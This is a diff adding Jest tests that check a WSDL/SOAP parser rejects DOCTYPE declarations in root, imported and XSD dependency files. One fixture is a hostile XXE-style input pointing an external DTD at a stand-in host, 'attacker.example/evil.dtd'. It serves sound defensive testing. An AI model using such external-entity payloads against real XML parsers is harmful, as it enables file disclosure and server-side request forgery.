@@ -49,6 +49,23 @@ describe('parseWsdl', () => {
     expect(() => parseWsdl('')).toThrow(/SOAP_EMPTY_WSDL/);
   });
 
+  it('rejects DTD declarations before parsing root or imported WSDL content', () => {
+    const rootDtd = wsdl.replace(
+      /<\?xml([^?]*)\?>/,
+      '<?xml$1?>\n<!DOCTYPE definitions [<!ENTITY internal "expanded">]>'
+    );
+    expect(() => parseWsdl(rootDtd)).toThrow(/SOAP_XML_DOCTYPE_FORBIDDEN/);
+
+    const imported = '<!DOCTYPE definitions SYSTEM "https://attacker.example/evil.dtd"><definitions xmlns="http://schemas.xmlsoap.org/wsdl/" targetNamespace="urn:imported"/>';
+    const withImport = wsdl.replace(
+      /<wsdl:definitions([\s\S]*?)>/,
+      '<wsdl:definitions$1><wsdl:import namespace="urn:imported" location="imported.wsdl"/>'
+    );
+    expect(() => parseWsdl(withImport, { resolveImport: () => imported })).toThrow(
+      /SOAP_XML_DOCTYPE_FORBIDDEN/
+    );
+  });
+
   it('throws a prefixed error on a non-WSDL root', () => {
     expect(() => parseWsdl('<html><body>not wsdl</body></html>')).toThrow(/SOAP_WSDL_ROOT_INVALID/);
   });
@@ -163,6 +180,23 @@ describe('parseWsdl', () => {
     expect(index.schemaIndex.elements.has('urn:x|Op')).toBe(true);
     expect(index.schemaIndex.elements.has('urn:x/shared|SharedField')).toBe(true);
     expect(index.services[0]!.operations[0]!.name).toBe('Op');
+
+    const dtdTypes = types.replace(
+      /<\?xml([^?]*)\?>/,
+      '<?xml$1?>\n<!DOCTYPE schema [<!ENTITY internal "expanded">]>'
+    );
+    const dtdBundle = createDefinitionBundle({
+      rootPath: 'service.wsdl',
+      format: 'wsdl',
+      completeness: 'full',
+      provenance: { source: 'spec-path', evidence: ['soap-parser-test'] },
+      files: [
+        createDefinitionFile({ path: 'service.wsdl', role: 'root', bytes: Buffer.from(root, 'utf8') }),
+        createDefinitionFile({ path: 'schemas/types.xsd', role: 'dependency', bytes: Buffer.from(dtdTypes, 'utf8') }),
+        createDefinitionFile({ path: 'shared/common.xsd', role: 'dependency', bytes: Buffer.from(shared, 'utf8') })
+      ]
+    });
+    expect(() => parseWsdl(root, { definitionBundle: dtdBundle })).toThrow(/SOAP_XML_DOCTYPE_FORBIDDEN/);
   });
 
   it('fails when a nested XSD import is missing from the confined bundle', () => {
